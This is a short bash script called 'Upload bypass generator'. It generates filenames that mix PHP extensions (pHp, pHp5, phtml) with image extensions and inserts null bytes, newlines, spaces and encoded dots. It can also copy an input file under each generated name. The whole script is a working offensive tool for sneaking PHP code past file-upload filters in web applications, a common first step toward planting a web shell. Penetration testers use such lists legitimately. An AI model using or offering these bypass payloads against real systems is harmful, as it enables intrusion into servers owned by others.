#!/bin/bash

if (( $# != 4 ))
then
    echo "Upload bypass generator"
    echo "Usage : $0 <list|gen> <best|all> <filename> <extension (gif,jpg,png)>"
    exit
fi

createfile=$1
listtype=$2
origin_filename=$3
extdest=$4

filename=$(basename -- "$origin_filename")
extension="${filename##*.}"
filename="${filename%.*}"

if [ $createfile = "gen" ]
then
    createfile=1
else
    createfile=0
fi

ending=("" " " ".")
dot=("." "%2E") # "%252E" "%C0%2E" "%C4%AE" "%C0%AE")

if [ $listtype = "best" ]
then
    extphp=("pHp" "pHp5")
    escape=(" " "%20" "%00" "%0a")
else
    #extphp=("php" "php3" "php4" "php" "php5" "phtml" "inc", "phar")
    extphp=("php" "pHp5" "phtml")
    escape=("?" "#" ";" "%20" "%00" "%0a" "%0d" "%0a0d" "%0a%0d")
fi


for ext in "${extphp[@]}"; do
    for esc in "${escape[@]}"; do
        for end in "${ending[@]}"; do
            for d in "${dot[@]}"; do

                if (( $createfile == 0 ))
                then
                    echo "$filename.$ext$esc$d$extdest$end"
                    echo "$filename.$extdest$esc$d$ext$end"
                else
                    cp "$origin_filename" "$filename.$ext$esc.$extdest"
                    cp "$origin_filename" "$filename.$extdest$esc.$ext"
                fi
            done
        done
    done
done


